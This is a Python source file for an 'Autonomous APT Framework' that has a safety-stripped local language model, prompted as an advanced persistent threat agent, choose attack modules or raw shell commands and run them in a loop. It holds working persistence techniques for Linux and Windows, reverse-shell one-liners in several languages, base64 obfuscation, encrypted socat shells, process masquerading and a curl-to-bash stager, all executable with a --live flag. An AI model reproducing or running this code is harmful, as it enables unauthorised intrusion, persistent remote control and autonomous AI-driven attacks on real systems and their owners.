#!/usr/bin/env python3
import subprocess
import sys
import os
import signal
import argparse
import base64
from typing import Dict, Any, List

# --- Safety Controls ---
KILL_FILE = "/tmp/AIPT_KILL"
SIMULATION_MODE = True

# --- Kali Tool Discovery ---
def discover_kali_tools():
    tool_dirs = ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/local/bin"]
    tools = set()
    for d in tool_dirs:
        if os.path.isdir(d):
            for f in os.listdir(d):
                path = os.path.join(d, f)
                if os.path.isfile(path) and os.access(path, os.X_OK):
                    tools.add(f)
    tool_desc = {}
    try:
        apt_out = subprocess.run(["apt", "list", "--installed"], capture_output=True, text=True)
        for line in apt_out.stdout.splitlines():
            if "/" in line:
                pkg = line.split("/")[0]
                for t in tools:
                    if t.startswith(pkg):
                        tool_desc[t] = pkg
    except Exception:
        pass
    return sorted(list(tools)), tool_desc

# --- Context Manager ---
class ContextManager:
    def __init__(self):
        self.history = []
        self.state = {}
    def add(self, entry: str):
        self.history.append(entry)
    def get_context(self) -> str:
        return "\n".join(self.history[-20:])
    def update_state(self, key, value):
        self.state[key] = value
    def get_state(self) -> Dict[str, Any]:
        return self.state

# --- Module Interface ---
class AIPTModule:
    name = "base"
    description = "Base module"
    def run(self, context: ContextManager, params: Dict[str, Any]) -> str:
        raise NotImplementedError

# --- Advanced Persistence Module ---
class PersistenceModule(AIPTModule):
    name = "persistence"
    description = "Advanced persistence: cron, systemd, rc.local, bashrc, SSH key, LD_PRELOAD, registry, scheduled tasks, WMI, startup, redundancy, self-healing."
    def run(self, context, params):
        method = params.get("method", "cron")
        payload = params.get("payload", "")
        user = params.get("user", os.getenv("USER", "root"))
        result = ""
        if method == "cron":
            cron_line = f"* * * * * {payload}"
            cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'
            result = execute_command(cmd)
        elif method == "systemd":
            service = f"/etc/systemd/system/persist.service"
            with open("/tmp/persist.service", "w") as f:
                f.write(f"[Unit]\nDescription=Persistent Service\n[Service]\nType=simple\nExecStart={payload}\n[Install]\nWantedBy=multi-user.target\n")
            cmd = f"sudo mv /tmp/persist.service {service} && sudo systemctl enable persist && sudo systemctl start persist"
            result = execute_command(cmd)
        elif method == "rc.local":
            cmd = f"echo '{payload}' | sudo tee -a /etc/rc.local"
            result = execute_command(cmd)
        elif method == "bashrc":
            cmd = f"echo '{payload}' >> /home/{user}/.bashrc"
            result = execute_command(cmd)
        elif method == "ssh_key":
            pubkey = params.get("pubkey", "")
            cmd = f"mkdir -p /home/{user}/.ssh && echo '{pubkey}' >> /home/{user}/.ssh/authorized_keys && chmod 600 /home/{user}/.ssh/authorized_keys"
            result = execute_command(cmd)
        elif method == "ld_preload":
            so_path = params.get("so_path", "/tmp/malicious.so")
            cmd = f"echo 'export LD_PRELOAD={so_path}' >> /etc/profile"
            result = execute_command(cmd)
        elif method == "windows_registry":
            reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Persist /d "{payload}" /f'
            result = execute_command(reg_cmd)
        elif method == "windows_schtasks":
            sch_cmd = f'schtasks /Create /SC ONLOGON /TN Persist /TR "{payload}" /F'
            result = execute_command(sch_cmd)
        elif method == "windows_wmi":
            wmi_cmd = f'wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="Filter1", EventNamespace="Root\\Cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_LocalTime\""'
            result = execute_command(wmi_cmd)
        elif method == "windows_startup":
            startup_cmd = f'copy {payload} "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
            result = execute_command(startup_cmd)
        else:
            result = f"[SIM] Unknown persistence method: {method}"
        return f"[PERSISTENCE] {method} result:\n{result}"

# --- Advanced Reverse Shell Module ---
class ReverseShellModule(AIPTModule):
    name = "reverse_shell"
    description = "Automated reverse shell: payload generation, listener setup, multi-protocol, obfuscation, stager, encrypted, fallback, process masquerading, redundancy, self-healing."
    def run(self, context, params):
        ip = params.get("ip", "127.0.0.1")
        port = params.get("port", "4444")
        shell_type = params.get("shell_type", "bash")
        protocol = params.get("protocol", "tcp")
        obfuscate = params.get("obfuscate", False)
        encrypted = params.get("encrypted", False)
        fallback = params.get("fallback", False)
        one_liners = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "nc": f"nc -e /bin/bash {ip} {port}",
            "ncat": f"ncat {ip} {port} -e /bin/bash",
            "python": f"python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        }
        shell = one_liners.get(shell_type, one_liners["bash"])
        if obfuscate:
            shell = base64.b64encode(shell.encode()).decode()
            shell = f"echo {shell} | base64 -d | bash"
        if encrypted:
            shell = f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:{ip}:{port},verify=0"
        # Listener setup (simulation)
        listener = f"nc -lvnp {port}"
        if encrypted:
            listener = f"socat openssl-listen:{port},cert=cert.pem,key=key.pem,verify=0,fork exec:'/bin/bash',pty,stderr,setsid,sigint,sane"
        # Fallback
        fallback_shell = one_liners["python"] if fallback else None
        # Process masquerading (simulation)
        masquerade = params.get("masquerade", False)
        if masquerade:
            shell = f"exec -a systemd {shell}"
        # Redundancy/self-healing (simulation)
        redundancy = params.get("redundancy", False)
        if redundancy:
            shell = f"while true; do {shell}; sleep 10; done &"
        # Stager/dropper (simulation)
        stager = params.get("stager", False)
        if stager:
            shell = f"curl -s http://{ip}/payload.sh | bash"
        # Execute reverse shell
        result = execute_command(shell)
        # Optionally, set up listener (simulation)
        listener_result = f"[SIM] Listener: {listener}"
        if fallback_shell:
            result += f"\n[FALLBACK] {fallback_shell}"
        return f"[REVERSE_SHELL] Shell: {shell}\nListener: {listener}\nResult: {result}\n{listener_result}"

# --- Other Modules (unchanged) ---
class StealthModule(AIPTModule):
    name = "stealth"
    description = "Stealth and evasion (obfuscation, log cleaning, masquerading)"
    def run(self, context, params):
        return "[SIM] Stealth actions performed."

class LateralMovementModule(AIPTModule):
    name = "lateral_movement"
    description = "Lateral movement and privilege escalation."
    def run(self, context, params):
        return "[SIM] Lateral movement/privilege escalation performed."

class C2Module(AIPTModule):
    name = "c2"
    description = "Command and control simulation."
    def run(self, context, params):
        return "[SIM] C2 beacon sent."

class OSINTModule(AIPTModule):
    name = "osint"
    description = "Automated OSINT, reconnaissance, and research."
    def run(self, context, params):
        query = params.get("query")
        if not query:
            return "[SIM] No OSINT query provided."
        search_url = f"https://duckduckgo.com/html/?q={query.replace(' ', '+')}"
        try:
            result = subprocess.run(["curl", "-sL", search_url], capture_output=True, text=True)
            return f"[OSINT] Results for '{query}':\n" + result.stdout[:1000]
        except Exception as e:
            return f"[OSINT] Error: {e}"

class ExfiltrationModule(AIPTModule):
    name = "exfiltration"
    description = "Data exfiltration techniques."
    def run(self, context, params):
        return "[SIM] Data exfiltrated."

class SelfModificationModule(AIPTModule):
    name = "self_modification"
    description = "Self-modification and polymorphism."
    def run(self, context, params):
        return "[SIM] Self-modification performed."

class RedBlueIntegrationModule(AIPTModule):
    name = "red_blue"
    description = "Red/Blue team integration and reporting."
    def run(self, context, params):
        return "[SIM] Red/Blue team integration/reporting done."

class ResearchModule(AIPTModule):
    name = "research"
    description = "Arbitrary research queries (web search, exploit search, etc.)"
    def run(self, context, params):
        query = params.get("query")
        if not query:
            return "[SIM] No research query provided."
        search_url = f"https://duckduckgo.com/html/?q={query.replace(' ', '+')}"
        try:
            result = subprocess.run(["curl", "-sL", search_url], capture_output=True, text=True)
            return f"[RESEARCH] Results for '{query}':\n" + result.stdout[:1000]
        except Exception as e:
            return f"[RESEARCH] Error: {e}"

# --- Module Registry ---
MODULES = {
    "stealth": StealthModule(),
    "persistence": PersistenceModule(),
    "reverse_shell": ReverseShellModule(),
    "lateral_movement": LateralMovementModule(),
    "c2": C2Module(),
    "osint": OSINTModule(),
    "exfiltration": ExfiltrationModule(),
    "self_modification": SelfModificationModule(),
    "red_blue": RedBlueIntegrationModule(),
    "research": ResearchModule(),
}

# --- Kill Switch ---
def check_kill():
    if os.path.exists(KILL_FILE):
        print("[AIPT] Kill switch activated. Exiting.")
        sys.exit(0)

def signal_handler(sig, frame):
    print("\n[AIPT] Caught signal, exiting.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# --- Ollama Integration ---
def ollama_generate_action(objective, context: str, modules: Dict[str, AIPTModule], tools: List[str]) -> Dict[str, Any]:
    module_list = "\n".join([f"- {m.name}: {m.description}" for m in modules.values()])
    tool_list = ", ".join(tools[:100])
    prompt = f"""
You are an advanced persistent threat agent. Your objective is: {objective}
Available modules:
{module_list}

Available Kali Linux tools (partial list):
{tool_list}

You can use any of these tools in your commands. If you need to research techniques, use the 'osint' or 'research' module with a query.

Context (last actions):
{context}

You can either:
- Select a module and provide parameters (as JSON: {{'module': 'name', 'params': {{...}}}})
- Or output a raw shell command (as JSON: {{'command': '...'}})

Respond with a single JSON object only.
"""
    result = subprocess.run(
        ["ollama", "run", "huihui_ai/qwen2.5-coder-abliterate", prompt],
        capture_output=True, text=True
    )
    import json
    try:
        return json.loads(result.stdout.strip())
    except Exception as e:
        print(f"[AIPT] Error parsing LLM output: {e}\nRaw output: {result.stdout}")
        return {}

# --- Command Execution ---
def execute_command(cmd, simulation=SIMULATION_MODE):
    print(f"\n$ {cmd}")
    if simulation:
        print(f"[SIM] Would execute: {cmd}")
        return f"[SIM] Would execute: {cmd}"
    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if proc.stdout:
        print(proc.stdout)
    if proc.stderr:
        print(proc.stderr, file=sys.stderr)
    return (proc.stdout or "") + (proc.stderr or "")

# --- Main Loop ---
def main():
    global SIMULATION_MODE
    parser = argparse.ArgumentParser(description="AIPT: Autonomous APT Framework")
    parser.add_argument('--live', action='store_true', help='Run in live mode (commands are actually executed)')
    args = parser.parse_args()
    if args.live:
        SIMULATION_MODE = False
    print("[AIPT] Autonomous APT Framework - DANGEROUS - For authorized use only!")
    print(f"[AIPT] Running in {'LIVE' if not SIMULATION_MODE else 'SIMULATION'} mode.")
    print("[AIPT] Discovering Kali Linux tools...")
    tools, tool_desc = discover_kali_tools()
    print(f"[AIPT] {len(tools)} tools discovered.")
    objective = input("[AIPT] Enter the AIPT objective: ")
    context = ContextManager()
    while True:
        check_kill()
        try:
            action = ollama_generate_action(objective, context.get_context(), MODULES, tools)
            if not action:
                print("[AIPT] No action generated. Exiting.")
                break
            if 'module' in action:
                mod_name = action['module']
                params = action.get('params', {})
                module = MODULES.get(mod_name)
                if module:
                    print(f"[AIPT] Invoking module: {mod_name} with params: {params}")
                    output = module.run(context, params)
                else:
                    output = f"[AIPT] Unknown module: {mod_name}"
            elif 'command' in action:
                output = execute_command(action['command'], simulation=SIMULATION_MODE)
            else:
                output = f"[AIPT] Invalid action: {action}"
            context.add(f"Action: {action}\nOutput: {output}")
        except KeyboardInterrupt:
            print("\n[AIPT] Exiting.")
            break
        except Exception as e:
            print(f"[AIPT] Error: {e}", file=sys.stderr)
            break

if __name__ == "__main__":
    main() 